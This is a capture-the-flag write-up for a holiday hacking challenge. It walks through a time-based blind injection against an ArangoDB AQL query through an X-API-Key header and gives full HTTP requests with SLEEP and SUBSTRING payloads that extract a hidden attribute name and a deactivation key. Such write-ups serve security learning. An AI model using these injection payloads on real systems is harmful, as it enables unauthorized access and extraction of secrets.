---
icon: material/text-box-outline
---

# Deactivate Frostbit Naughty-Nice List Publication 

**Official Difficulty**: :fontawesome-solid-star::fontawesome-solid-star::fontawesome-solid-star::fontawesome-solid-star::fontawesome-solid-star:<br/>

**My Difficulty Rating**:
:fontawesome-solid-gift::fontawesome-solid-gift::fontawesome-solid-gift::fontawesome-solid-gift::fontawesome-regular-square:<br/>

## Objective

!!! question "Request"
    Wombley's ransomware server is threatening to publish the Naughty-Nice list. Find a way to deactivate the publication of the Naughty-Nice list by the ransomware server.

??? quote "Tangle Coalbox"
    Ah, there ya are, Gumshoe! Tangle Coalbox at yer service.<br/>
    Heard the news, eh? The elves’ civil war took a turn for the worse, and now, things’ve really gone sideways. Someone’s gone and ransomware’d the Naughty-Nice List!<br/>
    And just when you think it can't get worse—turns out, it was none other than ol’ Wombley Cube. He used Frostbit ransomware, all right. But, in true Wombley fashion, he managed to lose the encryption keys!<br/>
    That’s right, the list is locked up tight, and it’s nearly the start of the holiday season. Not ideal, huh? We're up a frozen creek without a paddle, and Santa’s big day is comin’ fast.<br/>
    The whole North Pole’s stuck in a frosty mess, unless—there’s someone out there with the know-how to break us out of this pickle.<br/>
    If I know Wombley—and I reckon I do—he didn't quite grasp the intricacies of Frostbit’s encryption. That gives us a sliver o' hope.<br/>
    If you can crack into that code, reverse-engineer it, we just might have a shot at pullin’ these holidays outta the ice.<br/>
    It’s no small feat, mind ya, but somethin’ tells me you've got the brains to make it happen, Gumshoe.<br/>
    So, no pressure, but if we don’t get this solved, the holidays could be in a real bind. I'm countin’ on ya!<br/>
    And when ya do crack it, I reckon Santa’ll make sure you're on the extra nice list this year. What d’ya say?<br/>

## Hints

??? tip "Frostbit Publication"
    There must be a way to deactivate the ransomware server's data publication. Perhaps one of the other North Pole assets revealed something that could help us find the deactivation path. If so, we might be able to trick the Frostbit infrastructure into revealing more details.


??? tip "Frostbit Slumber"
    The Frostbit author may have mitigated the use of certain characters, verbs, and simple authentication bypasses, leaving us blind in this case. Therefore, we might need to trick the application into responding differently based on our input and measure its response. If we know the underlying technology used for data storage, we can replicate it locally using Docker containers, allowing us to develop and test techniques and payloads with greater insight into how the application functions.

??? tip "(my own): Portswigger Academy"
    This challenge uses an uncommon technology so there's not much useful information online about
    attacks. If you're not familiar with SQL, it can be 
    [helpful to learn about it for inspiration](https://portswigger.net/web-security/sql-injection/blind)


## Solution

!!! warning "Partial Solution"
    I completed this challenge after decrypt. It's not necessary to solve them in this order,
    but this solution assumes the first part of decrypt is completed in order to get us from
    a zip folder to a URL.

### Determine the vulnerability
In the Santa Vision challenge, when subscribed to the frostbitfeed MQTT feed, we saw the following 
message:

??? quote "MQTT feed"
    Error msg: Unauthorized access attempt. /api/v1/frostbitadmin/bot/<botuuid>/deactivate, authHeader: X-API-Key, status: Invalid Key, alert: Warning, recipient: Wombley

Given that we have a botuuid from the decrypt challenge, and we also want to deactivate, this is 
probably the path we want to use.

We already have the website from the Decrypt challenge, so what happens if we just try the path:
https://api.frostbit.app/api/v1/frostbitadmin/bot/e550ccc8-c8cf-4a58-ab68-3b527e14179d/deactivate

A simple "invalid request" response isn't very helpful, so we should see if there's a debug option
like there was for the status path:
https://api.frostbit.app/api/v1/frostbitadmin/bot/e550ccc8-c8cf-4a58-ab68-3b527e14179d/deactivate?debug=1

"Invalid Key" is a bit more useful. The MQTT error talked about `X-API-Key`, so it's probably referring
to that, and `X-` are normally headers, so from here on out, we'll use Burp Suite to make our requests.
Initially, I hoped this would be simple and just use the encryption key that we extracted in the last
objective, so I tried sending that but still just got the "Invalid Key" response.

Given the Slumber hint makes me think of a blind SQL injection, let's start with the classic SQL test:

```
GET /api/v1/frostbitadmin/bot/e550ccc8-c8cf-4a58-ab68-3b527e14179d/deactivate?debug=1 HTTP/2
Host: api.frostbit.app
Accept-Encoding: gzip, deflate, br
X-Api-Key: '
Accept: */*
Accept-Language: en-US;q=0.9,en;q=0.8
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/131.0.6778.140 Safari/537.36
Cache-Control: max-age=0
Content-Type: application/x-www-form-urlencoded
Content-Length: 0


```
Response:
```
HTTP/2 403 Forbidden
Server: nginx/1.27.1
Date: Sun, 29 Dec 2024 04:03:26 GMT
Content-Type: application/json
Content-Length: 186
Strict-Transport-Security: max-age=31536000

{"debug":true,"error":"Timeout or error in query:\nFOR doc IN config\n	FILTER doc.<key_name_omitted> == '{user_supplied_x_api_key}'\n	<other_query_lines_omitted>\n	RETURN doc"}

```

Welp, that's definitely not SQL. Trying to Google the error message was not particularly helpful, simply
returning a bunch of Python links (and "FILTER" means it's probably not Python!). Fortunately, the Bing
AI chat was a bit more helpful and pointed me to the [ArrangoDB and AQL](https://docs.arangodb.com).

There doesn't appear to be anyway to change the AQL message, so (as per the hint), we'll have
to brute force the values as a blind attack. Fortunately, AQL also has a SLEEP function,
which seems to work:

```
GET /api/v1/frostbitadmin/bot/e550ccc8-c8cf-4a58-ab68-3b527e14179d/deactivate?debug=1 HTTP/2
Host: api.frostbit.app
Accept-Encoding: gzip, deflate, br
X-Api-Key: '+SLEEP(5)+'
Accept: */*
Accept-Language: en-US;q=0.9,en;q=0.8
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/131.0.6778.140 Safari/537.36
Cache-Control: max-age=0
Content-Type: application/x-www-form-urlencoded
Content-Length: 0


```

!!! warning "URL encoding"
    In the above request, I have URL-encoded the spaces because I assumed this would be necessary.
    I'm not too sure why I thought that, but it's not needed and meant I took far longer to get my
    next request working.

So now that we know SLEEP works, we need to move it into an `OR` clause so that it will only run if
our guess is wrong. We also need to figure out what we're trying to guess.

### Make a plan
Presumably, we need the `<key_name_omitted>` value so that we can then dump that, and *then* finally
dump the value and use it to deactivate the ransomware.
In order to guess the key_name, we need to:

1. get the doc keys. For that, we can use the [ATTRIBUTES](https://docs.arangodb.com/3.10/aql/functions/document-object/#attributes) function.
2. convert the array of attributes into a string. The [NTH](https://docs.arangodb.com/3.10/aql/functions/array/#nth) function seems like it can do that.
3. get a single character of the string. [SUBSTRING](https://docs.arangodb.com/3.10/aql/functions/string/#substring) seems the key here.

We can then start guessing the first letter of the first attribute using Burp's intruder tool by setting
the X-API-Key to `'OR SUBSTRING(NTH(ATTRIBUTES(doc), 0), 0, 1) == '' OR SLEEP(5) AND 'a'=='a`.
This means the full query running will be:
```SQL
FOR doc IN config
FILTER doc.<key_name_omitted> == '' OR SUBSTRING(NTH(ATTRIBUTES(doc), 0), 0, 1) == '' OR SLEEP(5) and 'a'=='a'
...
RETURN doc
```

If the first letter of the first attribute in the document is '', the OR clause will short-circuit and return true before the SLEEP part. Otherwise it will SLEEP.


!!! info "Why doesn't the query just work if it returns true?"
    I assume part of the redacted query part is checking that only one `doc` is returned, or is
    timing out if more than one is returned. Unfortunately we don't seem to be able to just use 
    `LIMIT` or subqueries to resolve this, since so many functions are blocked.

### Execute the plan

Using Burpsuite's intruder with the sniper mode, we can run the following request with a simple character
payload (abcdefghijklmnopqrstuvwxyz0123456789-_)
```
GET /api/v1/frostbitadmin/bot/e550ccc8-c8cf-4a58-ab68-3b527e14179d/deactivate?debug=1 HTTP/2
Host: api.frostbit.app
Accept-Encoding: gzip, deflate, br
X-Api-Key: ' OR SUBSTRING(NTH(ATTRIBUTES(doc), 0), 0, 2) == 'd$$' OR SLEEP(5) AND 'a'=='a
Accept: */*
Accept-Language: en-US;q=0.9,en;q=0.8
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/131.0.6778.140 Safari/537.36
Cache-Control: max-age=0
Content-Type: application/x-www-form-urlencoded


```

!!! warning "Speeding up the Sleep"
    Making 38 requests when consecutively is pretty slow if they're all sleeping 5 seconds.
    If you're smarter than I was, you'll realise this and experiment to see that SLEEP(1) is
    enough before you begin the iteration.

Each time we find a letter (as noted by the faster response time and the smaller response body), we
add it to our current string, and increment the `SUBSTRING(..., 2)`.
Eventually, this shows us the attribute name: `deactivate_api_key`

That's probably the right attribute, so we don't need to start iterating through others (fortunately - sleep is slow, even if you're smart enough to minimise it!)

We can take the same approach to get the value of the key as above, but adapting our string to be
`' OR SUBSTRING(doc.deactivate_api_key, 0, 1) == '' OR SLEEP(1) AND 'a'='a`

!!! info "Gotta go fast"
    Since this is likely to be a UUID, it'll be faster if we rearrange our character set
    so that `-` and our numbers are checked before our letters.
    I haven't actually tested how much of a difference it makes, but it *feels* faster to me,
    and I'm too lazy to set BurpSuite up to be red.

```
GET /api/v1/frostbitadmin/bot/e550ccc8-c8cf-4a58-ab68-3b527e14179d/deactivate?debug=1 HTTP/2
Host: api.frostbit.app
Accept-Encoding: gzip, deflate, br
X-Api-Key: ' OR SUBSTRING(doc.deactivate_api_key, 0, 2) == 'a' OR SLEEP(1) AND 'a'=='a
Accept: */*
Accept-Language: en-US;q=0.9,en;q=0.8
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/131.0.6778.140 Safari/537.36
Cache-Control: max-age=0
Content-Type: application/x-www-form-urlencoded
Content-Length: 0


```

This eventually gives us the key which we can send in the X-API-Key header:

```
GET /api/v1/frostbitadmin/bot/e550ccc8-c8cf-4a58-ab68-3b527e14179d/deactivate?debug=1 HTTP/2
Host: api.frostbit.app
Accept-Encoding: gzip, deflate, br
X-Api-Key: abe7a6ad-715e-4e6a-901b-c9279a964f91
Accept: */*
Accept-Language: en-US;q=0.9,en;q=0.8
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/131.0.6778.140 Safari/537.36
Cache-Control: max-age=0
Content-Type: application/x-www-form-urlencoded
Content-Length: 0


```
Response:
```
HTTP/2 200 OK
Server: nginx/1.27.1
Date: Tue, 31 Dec 2024 04:36:14 GMT
Content-Type: application/json
Content-Length: 314
Strict-Transport-Security: max-age=31536000

{"message":"Response status code: 200, Response body: {\"result\":\"success\",\"rid\":\"e550ccc8-c8cf-4a58-ab68-3b527e14179d\",\"hash\":\"7f28073866327e959cd340cdbe483ffb4b098c726c4e4ed77b9f7c2dc21199f2\",\"uid\":\"14720\"}\nPOSTED WIN RESULTS FOR RID e550ccc8-c8cf-4a58-ab68-3b527e14179d","status":"Deactivated"}
```

## Response

!!! quote "Tangle Coalbox"
    Well, I’ll be a reindeer’s uncle! You've done it, Gumshoe! You cracked that frosty code and saved the Naughty-Nice List just in the nick of time. The elves’ll be singin’ your praises from here to the South Pole!<br/>
    I knew you had it in ya. Now, let’s get these toys delivered and make this a holiday to remember. You're a true North Pole hero!<br/>
